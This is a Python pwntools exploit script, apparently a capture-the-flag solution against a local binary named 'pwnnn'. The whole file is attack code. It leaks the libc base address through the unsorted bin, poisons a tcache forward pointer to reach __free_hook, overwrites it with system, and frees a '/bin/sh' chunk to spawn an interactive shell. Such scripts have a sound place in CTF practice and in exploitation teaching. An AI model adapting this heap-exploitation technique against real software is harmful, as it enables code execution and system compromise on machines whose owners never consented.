#!/usr/bin/env python
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1
if local:
    p = process('./pwnnn')
    elf = ELF('./pwnnn')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    pass

def choice(c):
    p.sendlineafter('>> ', str(c))

def add(data):
    choice(1)
    p.send(data)

def delete():
    choice(2)

def show():
    choice(3)

def flip():
    choice(4)

# leak libc
for i in range(7):
    add(chr(i).ljust(0x100, '\x00'))
add(chr(7).ljust(0x100, '\x00')) # put into unsorted bin
add(chr(66).ljust(0x100, '\x00')) # padding
add(chr(7).ljust(0x100, '\x00')) # change idx=7
flip()
delete()
flip()
show()
libc_base = u64(p.recv(6).ljust(8, '\x00')) - 0x3ebca0
info('libc_base = ' + hex(libc_base))

def cal(n):
    #print 'n =>', hex(n)
    s = 0
    while n > 0:
        s += n & 0xff
        n >>= 8
    #print 's =>', hex(s)
    r = 0x7f - (s % 0x80)
    return chr(r)

# forge __free_hook
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
bin_sh_addr = libc_base + next(libc.search('/bin/sh\x00'))
for i in range(10, 15):
    add(chr(i).ljust(0x100, '\x00'))
add(chr(16).ljust(0x100, '\x00'))
add(chr(15).ljust(0x100, '\x00'))
flip()
add(chr(10).ljust(0x100, '\x00')) # change idx
delete() # set tacache sequence
flip()
add(p64(free_hook ^ 0xdeadbeefcafebabe) + cal(free_hook ^ 0xdeadbeefcafebabe).ljust(0xf8, '\x00')) # forge tcache fd
add('/bin/sh\x00'.ljust(0x100, '\x00'))
add(p64(system)) # forge __free_hook to system
add('/bin/sh\x00'.ljust(0x100, '\x00')) # change idx
delete()

#gdb.attach(p)

p.interactive()

